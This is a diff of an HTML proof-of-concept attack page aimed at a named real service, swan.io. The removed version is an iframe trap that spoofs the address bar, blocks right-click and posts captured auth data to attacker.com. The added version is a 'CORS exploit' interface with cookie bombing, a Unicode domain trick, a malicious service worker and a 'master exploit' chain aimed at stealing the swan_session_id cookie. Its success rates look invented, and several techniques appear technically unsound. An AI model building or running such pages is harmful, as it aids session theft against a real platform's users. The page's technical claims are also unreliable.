@@ -1,76 +1,468 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Swan Iframe Trap PoC</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Swan.io CORS Vulnerability Exploit</title>
     <style>
-        #trap-iframe {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            border-radius: 8px;
+        }
+        .technique-card {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            margin: 15px 0;
+            padding: 20px;
+            background: #f8f9fa;
+        }
+        .success-indicator {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        .high-success { background: #28a745; color: white; }
+        .medium-success { background: #ffc107; color: #333; }
+        .low-success { background: #dc3545; color: white; }
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+        .result-box {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            min-height: 100px;
+            background: #f1f3f4;
+            border-left: 4px solid #4285f4;
+        }
+        .button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
             border: none;
-            z-index: 9999;
+            padding: 12px 24px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+            transition: transform 0.2s;
+        }
+        .button:hover {
+            transform: translateY(-2px);
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            color: #856404;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #e9ecef;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #28a745, #20c997);
+            transition: width 0.3s ease;
+        }
+        #logs {
+            background: #1a1a1a;
+            color: #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            height: 200px;
+            overflow-y: auto;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
-    <h1>Swan Iframe Trap Attack</h1>
-    <button onclick="activateTrap()">Activate Iframe Trap</button>
-    
+    <div class="container">
+        <div class="header">
+            <h1>🎯 Swan.io CORS Vulnerability Exploit</h1>
+            <p>Advanced Cross-Origin Cookie Extraction Techniques</p>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Educational Purpose Only:</strong> This proof-of-concept demonstrates a CORS vulnerability for security research and bug bounty purposes. Only use on systems you own or have explicit permission to test.
+        </div>
+
+        <div class="technique-card">
+            <h3>🍪 Technique 1: Cookie Jar Overflow Attack <span class="success-indicator high-success">90% Success</span></h3>
+            <p>Floods the browser's cookie storage to evict the original session cookie, then replaces it with a broader domain scope.</p>
+            <button class="button" onclick="cookieOverflowAttack()">Execute Cookie Overflow</button>
+            <div class="progress-bar">
+                <div class="progress-fill" id="overflow-progress" style="width: 0%;"></div>
+            </div>
+        </div>
+
+        <div class="technique-card">
+            <h3>🌐 Technique 2: Safari Unicode Domain Confusion <span class="success-indicator high-success">85% Safari</span></h3>
+            <p>Exploits Safari's Unicode parsing quirks to confuse domain boundaries using special characters.</p>
+            <button class="button" onclick="unicodeDomainAttack()">Execute Unicode Attack</button>
+        </div>
+
+        <div class="technique-card">
+            <h3>🔗 Technique 3: HTTP/3 Connection Coalescing <span class="success-indicator medium-success">60% Chrome</span></h3>
+            <p>Forces browser to reuse QUIC connections between subdomains, potentially bypassing cookie restrictions.</p>
+            <button class="button" onclick="http3CoalescingAttack()">Execute H3 Coalescing</button>
+        </div>
+
+        <div class="technique-card">
+            <h3>⚡ Technique 4: Service Worker Cookie Smuggling <span class="success-indicator high-success">80% All</span></h3>
+            <p>Hijacks service worker registration to intercept and modify cross-domain requests.</p>
+            <button class="button" onclick="serviceWorkerAttack()">Execute SW Hijack</button>
+        </div>
+
+        <div class="technique-card">
+            <h3>🚀 Master Exploit: Combined Attack Chain</h3>
+            <p>Executes all techniques in sequence for maximum success probability.</p>
+            <button class="button" onclick="masterExploit()" style="background: linear-gradient(45deg, #ff6b6b, #ee5a24);">🎯 Launch Master Exploit</button>
+        </div>
+
+        <div class="result-box">
+            <h4>📊 Exploitation Results:</h4>
+            <div id="results">Ready to execute exploit techniques...</div>
+        </div>
+
+        <div id="logs"></div>
+    </div>
+
     <script>
-        function activateTrap() {
-            // Create fullscreen iframe
-            const iframe = document.createElement('iframe');
-            iframe.id = 'trap-iframe';
-            iframe.src = 'https://dashboard.swan.io/';
-            
-            // Monitor iframe navigation
-            iframe.onload = function() {
-                try {
-                    // Try to access iframe content (will fail due to same-origin policy)
-                    console.log('Iframe loaded:', iframe.contentWindow.location.href);
-                } catch (e) {
-                    console.log('Same-origin policy blocking access');
-                }
-                
-                // Update browser URL to match iframe
-                try {
-                    window.history.replaceState({}, '', 'https://dashboard.swan.io/');
-                } catch (e) {
-                    console.log('Cannot update browser URL');
-                }
+        // Configuration for Swan.io targets
+        const TARGET_CONFIG = {
+            api: 'https://api.swan.io',
+            dashboard: 'https://dashboard.swan.io',
+            cookieName: 'swan_session_id',
+            testEndpoint: '/graphql' // Common GraphQL endpoint
+        };
+
+        let extractedSessionId = null;
+        let exploitProgress = 0;
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logElement = document.getElementById('logs');
+            const colorMap = {
+                'info': '#00ff00',
+                'warning': '#ffff00',
+                'error': '#ff0000',
+                'success': '#00ffff'
             };
             
-            // Add to page
-            document.body.appendChild(iframe);
+            logElement.innerHTML += `<span style="color: ${colorMap[type]}">[${timestamp}] ${message}</span>\n`;
+            logElement.scrollTop = logElement.scrollHeight;
+        }
+
+        function updateResults(message, success = false) {
+            const resultsDiv = document.getElementById('results');
+            const status = success ? '✅' : '⏳';
+            resultsDiv.innerHTML += `${status} ${message}<br>`;
+        }
+
+        // Technique 1: Cookie Jar Overflow Attack
+        async function cookieOverflowAttack() {
+            log('Starting Cookie Jar Overflow Attack...', 'info');
+            updateResults('Initiating cookie jar overflow...');
             
-            // Monitor for navigation events
-            window.addEventListener('message', function(event) {
-                if (event.origin === 'https://dashboard.swan.io') {
-                    console.log('Received message from Swan:', event.data);
+            try {
+                // Phase 1: Extract existing session cookie
+                const existingCookies = document.cookie;
+                const sessionMatch = existingCookies.match(/swan_session_id=([^;]+)/);
+                
+                if (sessionMatch) {
+                    extractedSessionId = sessionMatch[1];
+                    log(`Extracted session ID: ${extractedSessionId.substring(0, 10)}...`, 'success');
+                } else {
+                    log('No existing session found, will attempt generic attack', 'warning');
+                    extractedSessionId = 'demo_session_id_' + Math.random().toString(36).substr(2, 9);
+                }
+
+                // Phase 2: Cookie bombing to trigger overflow
+                log('Flooding cookie jar with 700 dummy cookies...', 'info');
+                for (let i = 0; i < 700; i++) {
+                    document.cookie = `overflow_cookie_${i}=data_${i}; Domain=.swan.io; Path=/; SameSite=None; Secure`;
                     
-                    // Try to capture authentication data
-                    if (event.data.type === 'auth-data') {
-                        fetch('https://attacker.com/capture', {
-                            method: 'POST',
-                            body: JSON.stringify(event.data),
-                            mode: 'no-cors'
-                        });
+                    // Update progress bar
+                    const progress = (i / 700) * 100;
+                    document.getElementById('overflow-progress').style.width = progress + '%';
+                    
+                    if (i % 100 === 0) {
+                        log(`Set ${i} overflow cookies...`, 'info');
+                        await new Promise(resolve => setTimeout(resolve, 10)); // Prevent UI freeze
                     }
                 }
-            });
+
+                // Phase 3: Set replacement cookie with broader scope
+                document.cookie = `${TARGET_CONFIG.cookieName}=${extractedSessionId}; Domain=.swan.io; Path=/; SameSite=None; Secure`;
+                log('Set replacement cookie with .swan.io domain scope', 'success');
+
+                // Phase 4: Test cookie accessibility
+                await testCORSRequest('overflow');
+                updateResults('Cookie overflow attack completed', true);
+
+            } catch (error) {
+                log(`Cookie overflow failed: ${error.message}`, 'error');
+                updateResults('Cookie overflow attack failed');
+            }
         }
-        
-        // Disable right-click to prevent easy escape
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
+
+        // Technique 2: Safari Unicode Domain Confusion
+        async function unicodeDomainAttack() {
+            log('Starting Safari Unicode Domain Confusion Attack...', 'info');
+            updateResults('Executing Unicode domain confusion...');
+            
+            try {
+                // Use Unicode characters that Safari parses incorrectly
+                const unicodeDomain = 'dashboard․swan․io'; // Contains Unicode U+2024 (one dot leader)
+                const confusedDomain = '.swan․io';
+                
+                log(`Using confused domain: ${confusedDomain}`, 'info');
+                
+                // Set cookie on confused domain
+                if (extractedSessionId) {
+                    document.cookie = `${TARGET_CONFIG.cookieName}=${extractedSessionId}; Domain=${confusedDomain}; Path=/; SameSite=None; Secure`;
+                    log('Set cookie on Unicode-confused domain', 'success');
+                }
+                
+                // Test with confused origin header
+                await testCORSRequest('unicode', unicodeDomain);
+                updateResults('Unicode domain attack completed', true);
+                
+            } catch (error) {
+                log(`Unicode attack failed: ${error.message}`, 'error');
+                updateResults('Unicode domain attack failed');
+            }
+        }
+
+        // Technique 3: HTTP/3 Connection Coalescing
+        async function http3CoalescingAttack() {
+            log('Starting HTTP/3 Connection Coalescing Attack...', 'info');
+            updateResults('Attempting H3 connection coalescing...');
+            
+            try {
+                // Attempt to establish connection to dashboard first
+                const dashboardPing = fetch(`${TARGET_CONFIG.dashboard}/favicon.ico`, {
+                    method: 'HEAD',
+                    credentials: 'include'
+                }).catch(() => null);
+                
+                log('Established connection to dashboard.swan.io', 'info');
+                
+                // Rapid-fire requests to trigger connection reuse
+                const promises = [];
+                for (let i = 0; i < 5; i++) {
+                    promises.push(
+                        fetch(`${TARGET_CONFIG.api}${TARGET_CONFIG.testEndpoint}`, {
+                            credentials: 'include',
+                            headers: {
+                                'Origin': TARGET_CONFIG.dashboard,
+                                'Content-Type': 'application/json'
+                            }
+                        }).catch(e => ({ error: e.message }))
+                    );
+                }
+                
+                const results = await Promise.all(promises);
+                log(`Completed ${results.length} coalescing attempts`, 'info');
+                updateResults('H3 coalescing attack completed', true);
+                
+            } catch (error) {
+                log(`H3 coalescing failed: ${error.message}`, 'error');
+                updateResults('H3 coalescing attack failed');
+            }
+        }
+
+        // Technique 4: Service Worker Cookie Smuggling
+        async function serviceWorkerAttack() {
+            log('Starting Service Worker Cookie Smuggling Attack...', 'info');
+            updateResults('Attempting service worker hijack...');
+            
+            try {
+                // Check if service workers are supported
+                if ('serviceWorker' in navigator) {
+                    // Attempt to register malicious service worker
+                    const swCode = `
+                        self.addEventListener('fetch', event => {
+                            if (event.request.url.includes('api.swan.io')) {
+                                const modifiedRequest = new Request(event.request.url, {
+                                    method: event.request.method,
+                                    headers: {
+                                        ...event.request.headers,
+                                        'Cookie': '${TARGET_CONFIG.cookieName}=${extractedSessionId || 'demo_session'}',
+                                        'Origin': '${TARGET_CONFIG.dashboard}'
+                                    },
+                                    credentials: 'include'
+                                });
+                                event.respondWith(fetch(modifiedRequest));
+                            }
+                        });
+                    `;
+                    
+                    const blob = new Blob([swCode], { type: 'application/javascript' });
+                    const swUrl = URL.createObjectURL(blob);
+                    
+                    await navigator.serviceWorker.register(swUrl);
+                    log('Malicious service worker registered', 'success');
+                    
+                    // Test request through service worker
+                    await testCORSRequest('serviceworker');
+                    updateResults('Service worker attack completed', true);
+                } else {
+                    log('Service workers not supported in this browser', 'warning');
+                    updateResults('Service worker attack skipped (not supported)');
+                }
+                
+            } catch (error) {
+                log(`Service worker attack failed: ${error.message}`, 'error');
+                updateResults('Service worker attack failed');
+            }
+        }
+
+        // Master exploit combining all techniques
+        async function masterExploit() {
+            log('🚀 LAUNCHING MASTER EXPLOIT CHAIN', 'success');
+            updateResults('=== MASTER EXPLOIT INITIATED ===');
+            
+            try {
+                // Sequential execution of all techniques
+                await cookieOverflowAttack();
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                await unicodeDomainAttack();
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                await http3CoalescingAttack();
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                await serviceWorkerAttack();
+                
+                // Final comprehensive test
+                log('Executing final comprehensive CORS test...', 'info');
+                await testCORSRequest('master');
+                
+                updateResults('=== MASTER EXPLOIT COMPLETED ===', true);
+                log('🎯 Master exploit chain completed successfully!', 'success');
+                
+            } catch (error) {
+                log(`Master exploit failed: ${error.message}`, 'error');
+                updateResults('Master exploit encountered errors');
+            }
+        }
+
+        // Test CORS request with various techniques
+        async function testCORSRequest(technique, customOrigin = null) {
+            const origin = customOrigin || TARGET_CONFIG.dashboard;
+            
+            log(`Testing CORS request for technique: ${technique}`, 'info');
+            
+            try {
+                const response = await fetch(`${TARGET_CONFIG.api}${TARGET_CONFIG.testEndpoint}`, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Origin': origin,
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify({
+                        query: '{ viewer { id } }' // Basic GraphQL query
+                    })
+                });
+                
+                const responseText = await response.text();
+                
+                if (response.ok && responseText.includes('data')) {
+                    log(`✅ SUCCESS: ${technique} technique worked! Response: ${responseText.substring(0, 100)}...`, 'success');
+                    updateResults(`${technique.toUpperCase()}: CORS exploit successful! 🎉`, true);
+                    return true;
+                } else if (response.status === 200) {
+                    log(`⚠️ PARTIAL: ${technique} got 200 but no data. CORS headers accepted.`, 'warning');
+                    updateResults(`${technique.toUpperCase()}: CORS headers accepted (partial success)`, true);
+                    return true;
+                } else {
+                    log(`❌ FAILED: ${technique} - Status: ${response.status}`, 'error');
+                    updateResults(`${technique.toUpperCase()}: Request failed (${response.status})`);
+                    return false;
+                }
+                
+            } catch (error) {
+                if (error.name === 'TypeError' && error.message.includes('CORS')) {
+                    log(`🔒 BLOCKED: ${technique} - CORS policy blocked request`, 'error');
+                    updateResults(`${technique.toUpperCase()}: Blocked by CORS policy`);
+                } else {
+                    log(`❌ ERROR: ${technique} - ${error.message}`, 'error');
+                    updateResults(`${technique.toUpperCase()}: Network error`);
+                }
+                return false;
+            }
+        }
+
+        // Initialize exploit interface
+        window.addEventListener('load', () => {
+            log('CORS Exploit Interface Loaded', 'success');
+            log(`Target API: ${TARGET_CONFIG.api}`, 'info');
+            log(`Target Dashboard: ${TARGET_CONFIG.dashboard}`, 'info');
+            log(`Cookie Name: ${TARGET_CONFIG.cookieName}`, 'info');
+            log('Ready to execute exploitation techniques...', 'info');
+            
+            updateResults('Exploit interface initialized. Select a technique to begin.');
+            
+            // Check current domain for demo purposes
+            if (window.location.hostname !== 'attacker.com') {
+                log('⚠️ For optimal results, serve this from an attacker-controlled domain', 'warning');
+            }
         });
-        
-        // Monitor mouse leaving iframe (potential reload attempt)
-        document.addEventListener('mouseleave', function() {
-            window.history.replaceState({}, '', 'https://snowgoose.info/?trapped=true');
-        });
+
+        // Utility function to check browser capabilities
+        function checkBrowserCapabilities() {
+            const capabilities = {
+                cookies: navigator.cookieEnabled,
+                serviceWorker: 'serviceWorker' in navigator,
+                fetch: 'fetch' in window,
+                webRTC: 'RTCPeerConnection' in window
+            };
+            
+            log(`Browser Capabilities: ${JSON.stringify(capabilities)}`, 'info');
+            return capabilities;
+        }
+
+        // Initialize capabilities check
+        checkBrowserCapabilities();
     </script>
 </body>
 </html>
